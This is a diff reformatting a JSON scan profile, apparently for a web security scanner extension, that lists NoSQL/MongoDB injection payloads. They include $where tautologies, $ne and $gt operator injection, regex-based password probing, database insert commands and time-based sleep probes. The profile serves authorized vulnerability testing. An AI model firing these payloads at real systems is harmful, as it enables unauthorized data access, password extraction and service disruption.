@@ -1,1 +1,54 @@
-[{"Name":"NoSQL","Active":true,"Scanner":1,"Payloads":["true, $where: \u00271 == 1\u0027",", $where: \u00271 == 1\u0027","$where: \u00271 == 1\u0027","\u0027, $where: \u00271 == 1\u0027","1, $where: \u00271 == 1\u0027","{ $ne: 1 }","\u0027, $or: [ {}, { \u0027a\u0027:\u0027a","\u0027 } ], $comment:\u0027successful MongoDB injection\u0027","db.injection.insert({success:1});","db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1","|| 1==1","\u0027 \u0026\u0026 this.password.match(/.*/)//+%00","\u0027 \u0026\u0026 this.passwordzz.match(/.*/)//+%00","\u0027%20%26%26%20this.password.match(/.*/)//+%00","\u0027%20%26%26%20this.passwordzz.match(/.*/)//+%00","{$gt: \u0027\u0027}","[$ne]=1","\u0027;sleep(5000);","\u0027;it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);"],"Encoder":[],"UrlEncode":false,"CharsToUrlEncode":"","SearchString":"","ReplaceString":"","Grep":["error"],"PayloadResponse":false,"NotResponse":false,"NotCookie":false,"CaseSensitive":false,"ExcludeHTTP":false,"OnlyHTTP":false,"IsContentType":false,"ContentType":"","IsResponseCode":false,"ResponseCode":"","MatchType":1,"IssueName":"NoSQL","IssueSeverity":"Information","IssueConfidence":"Certain","IssueDetail":"NoSQL\n\n\u003cgrep\u003e","RemediationDetail":"","IssueBackground":"","RemediationBackground":""}]
+[
+ {
+  "Name": "NoSQL", 
+  "Active": true, 
+  "Scanner": 1, 
+  "Payloads": [
+   "true, $where: '1 == 1'", 
+   ", $where: '1 == 1'", 
+   "$where: '1 == 1'", 
+   "', $where: '1 == 1'", 
+   "1, $where: '1 == 1'", 
+   "{ $ne: 1 }", 
+   "', $or: [ {}, { 'a':'a", 
+   "' } ], $comment:'successful MongoDB injection'", 
+   "db.injection.insert({success:1});", 
+   "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1", 
+   "|| 1==1", 
+   "' && this.password.match(/.*/)//+%00", 
+   "' && this.passwordzz.match(/.*/)//+%00", 
+   "'%20%26%26%20this.password.match(/.*/)//+%00", 
+   "'%20%26%26%20this.passwordzz.match(/.*/)//+%00", 
+   "{$gt: ''}", 
+   "[$ne]=1", 
+   "';sleep(5000);", 
+   "';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);"
+  ], 
+  "Encoder": [], 
+  "UrlEncode": false, 
+  "CharsToUrlEncode": "", 
+  "SearchString": "", 
+  "ReplaceString": "", 
+  "Grep": [
+   "error"
+  ], 
+  "PayloadResponse": false, 
+  "NotResponse": false, 
+  "NotCookie": false, 
+  "CaseSensitive": false, 
+  "ExcludeHTTP": false, 
+  "OnlyHTTP": false, 
+  "IsContentType": false, 
+  "ContentType": "", 
+  "IsResponseCode": false, 
+  "ResponseCode": "", 
+  "MatchType": 1, 
+  "IssueName": "NoSQL", 
+  "IssueSeverity": "Information", 
+  "IssueConfidence": "Certain", 
+  "IssueDetail": "NoSQL\n\n<grep>", 
+  "RemediationDetail": "", 
+  "IssueBackground": "", 
+  "RemediationBackground": ""
+ }
+]
